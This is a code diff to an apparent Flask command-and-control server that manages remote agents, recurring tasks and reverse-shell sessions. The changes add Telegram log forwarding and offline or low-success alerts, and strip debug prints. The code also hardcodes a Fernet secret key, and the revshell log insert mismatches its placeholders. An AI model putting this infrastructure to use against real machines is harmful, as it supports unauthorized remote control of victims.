@@ -18,6 +18,8 @@ import time
 import folium
 import requests
 from collections import Counter
+from datetime import date
+
 app = Flask(__name__)
 load_dotenv()
 # Configure Flaks terminal colors Correctly
@@ -60,7 +62,8 @@ API_KEY = os.getenv("API_KEY")
 DATABASE = "c2.db"
 SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
 cipher = Fernet(SECRET_KEY)
-
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 #Folders & Directories
 UPLOAD_FOLDER = 'upload'
 PLUGINS_DIR = "./plugins"
@@ -70,6 +73,7 @@ os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.config['TOOLS_FOLDER'] = TOOLS_FOLDER
 app.secret_key = SECRET_KEY
+AGENT_ALERT_TIMEOUT = 5
 
 
 # --- Encryption functions ---
@@ -181,7 +185,7 @@ def beacon():
             }
             for row in task
         ]
-        print("formatted tasks:", formatted_tasks)
+
         return formatted_tasks
 
     return []
@@ -292,18 +296,16 @@ def agent_create():
     username = request.json.get("username")
     password = request.json.get("password")
     id_number = request.json.get("id")
-    print(username, password, id_number)
+
     db = get_db()
     existing_username = db.execute(
         "SELECT 1 FROM USERS WHERE username = ?",
         (username,)
     ).fetchone()
-    print(existing_username)
     existing_agentid = db.execute(
         "SELECT 1 FROM AGENTS WHERE ID = ?",
         (id_number,)
     ).fetchone()
-    print(existing_agentid)
     if existing_agentid:
         return {"error": "AgentID already exists"}, 400
     if existing_username:
@@ -378,8 +380,6 @@ def add_task():
     """, (task_uuid, agent_id, json.dumps(command),scheduled_at,recurring_every))
     db.commit()
     if recurring_every and recurring_every != "N/A":
-        print("initiating recurring task")
-        print("scheduled_at", scheduled_at)
         thread = threading.Thread(
         target=recurring_scheduler, args=(task_uuid, recurring_every, agent_id, command),daemon=True)
         thread.start()
@@ -427,7 +427,7 @@ def recurring_scheduler(task_uuid,recurring_every,agent_id,command):
                             INSERT INTO tasks (uuid, agent_id, task_json, output, scheduled_at, recurring_every)
                             VALUES (?, ?, ?, NULL, ?, NULL)
                         """, (new_uuid, agent_id, json.dumps(command), current_time))
-                    print(f"Successfully executed recurring task: {new_uuid}")
+
 
                 conn.commit()
                 conn.close()  # Always close it so you don't leak connections
@@ -440,7 +440,6 @@ def recurring_scheduler(task_uuid,recurring_every,agent_id,command):
 
 def restart_recurring_tasks(app):
     """Finds all recurring tasks in the DB and starts their threads."""
-    print("starting recurring tasks")
     with app.app_context():
         try:
             conn = sqlite3.connect("c2.db")
@@ -458,14 +457,12 @@ def restart_recurring_tasks(app):
             conn.close()
 
             if not tasks:
-                print("No recurring tasks found to resume.")
                 return
 
             for task in tasks:
                 task_uuid, agent_id, task_json, recurring_every, output= task
                 command = json.loads(task_json)  # Convert string back to dict
 
-                print(f"Resuming recurring task: {task_uuid} every {recurring_every}m")
 
                 # Call your existing scheduler function in a new thread
                 thread = threading.Thread(
@@ -980,11 +977,107 @@ def get_alerts():
 
     return jsonify(tasks_dict)
 
+
+def send_telegram_logs():
+    db = get_db()
+
+    # 1. Fetch only logs that haven't been sent yet
+    # We use 'sent = 0' to find new entries
+    rows = db.execute("SELECT * FROM logs WHERE sent = 0").fetchall()
+
+    if rows:
+        logs = []
+        ids_to_update = []
+
+        for row in rows:
+            # Convert row to dict for your list
+            log_dict = dict(row)
+            logs.append(log_dict)
+            # Keep track of the IDs so we can mark them as sent later
+            ids_to_update.append(log_dict['log_id'])
+
+        # 2. Format the logs into a single string
+        # Using a cleaner format than just str(log) to avoid curly braces in Telegram
+        text = "LOGS:\n"+ "\n".join(f"[{log.get('timestamp', 'INFO')}] {log.get('log_message', '')}" for log in logs)
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": CHAT_ID, "text": text}
+        response = requests.post(url, data=payload)
+        if response.status_code == 200:
+            placeholders = ', '.join(['?'] * len(ids_to_update))
+            db.execute(f"UPDATE logs SET sent = 1 WHERE log_id IN ({placeholders})", ids_to_update)
+            db.commit()
+            print("Telegram message sent!")
+        else:
+            print("Error sending Telegram message:", response.text)
+
 @app.route("/alerts")
 @require_token(role="admin")
 def alerts():
+    gen_alerts()
+    send_telegram_logs()
     return render_template("alerts.html")
 
+
+def gen_alerts():
+    current_time = datetime.now(timezone.utc)
+
+    db = get_db()
+    rows = db.execute("SELECT id, last_seen FROM agents").fetchall()
+
+    for row in rows:
+        last_seen_datetime = datetime.strptime(row[1], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
+        diff = current_time - last_seen_datetime
+
+        if diff >= timedelta(days=AGENT_ALERT_TIMEOUT):
+            log_message = f"Agent {row[0]} been offline for more than {AGENT_ALERT_TIMEOUT} days"
+            # Use string in YYYY-MM-DD format for safe comparison
+            today_str = current_time.strftime("%Y-%m-%d")
+            existing = db.execute(
+                "SELECT 1 FROM logs WHERE log_message = ? AND DATE(timestamp) = ?",
+                (log_message, today_str)
+            ).fetchone()
+
+
+            if not existing:
+                log_uuid = str(uuid.uuid4())
+                db.execute(
+                    "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) VALUES (?, ?, ?, ?, ?, ?)",
+                    (log_uuid, current_time, "None", log_message, "Critical", "None")
+                )
+                db.commit()
+
+    # Low execution success rate logs
+    res = get_piechart_task_success_rate()
+    statuses = res.json
+    results = {}
+    agents = statuses.get("agents", {})
+
+    for agent, stats in agents.items():
+        success = stats.get("success", 0)
+        failure = stats.get("failure", 0)
+        pending = stats.get("pending", 0)
+
+        total = success + failure + pending
+        rate = int(success / total * 100) if total else 0
+        results[agent] = rate
+
+    today_str = current_time.strftime("%Y-%m-%d")
+
+    for r in results:
+        if results[r] < 15:
+            log_message = f"Low execution success rate for Agent {r}"
+            existing = db.execute(
+                "SELECT 1 FROM logs WHERE log_message = ? AND DATE(timestamp) = ?",
+                (log_message, today_str)
+            ).fetchone()
+
+            if not existing:
+                log_uuid = str(uuid.uuid4())
+                db.execute(
+                    "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level, task_id) VALUES (?, ?, ?, ?, ?, ?)",
+                    (log_uuid, current_time, "None", log_message, "Critical", "None")
+                )
+                db.commit()
 @app.route("/tasks-data")
 @require_token(role="admin")
 def tasks_data():
@@ -1109,7 +1202,7 @@ def revshell():
     db = get_db()
     db.execute(
         "INSERT INTO logs (log_id, timestamp, role, log_message, alert_level,task_id) VALUES (?, ?, ?, ?, ?)",
-        (log_uuid, current_time, "administrator", f"Created a new Reverse shell", "Info",task_uuid))
+        (log_uuid, current_time, "administrator", f"Created a new Reverse shell", "Critical",task_uuid))
     db.commit()
 
     return jsonify({"status": "executed"})
